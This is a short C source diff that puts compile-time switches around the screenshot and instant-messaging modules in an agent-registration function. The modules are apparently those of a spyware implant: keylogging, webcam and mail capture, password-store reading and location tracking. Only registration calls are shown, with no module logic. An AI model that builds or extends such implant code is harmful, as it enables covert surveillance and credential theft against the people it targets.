@@ -434,7 +434,9 @@ void InitAgents()
 {
 	PM_FileAgentRegister();
 	PM_KeyLogRegister();
+#ifdef __ENABLE_SCREENSHOT_MODULE
 	PM_SnapShotRegister();
+#endif
 	PM_WiFiLocationRegister();
 	//PM_PrintAgentRegister();
 #ifdef __ENABLE_CRISIS_MODULE
@@ -445,7 +447,9 @@ void InitAgents()
 	PM_WebCamRegister();
 	PM_MailCapRegister();
 	PM_PStoreAgentRegister();
+#ifdef __ENABLE_IMAGENT_MODULE
 	PM_IMRegister();
+#endif
 	PM_DeviceInfoRegister();
 #ifdef __ENABLE_MONEY_MODULE
 	PM_MoneyRegister();
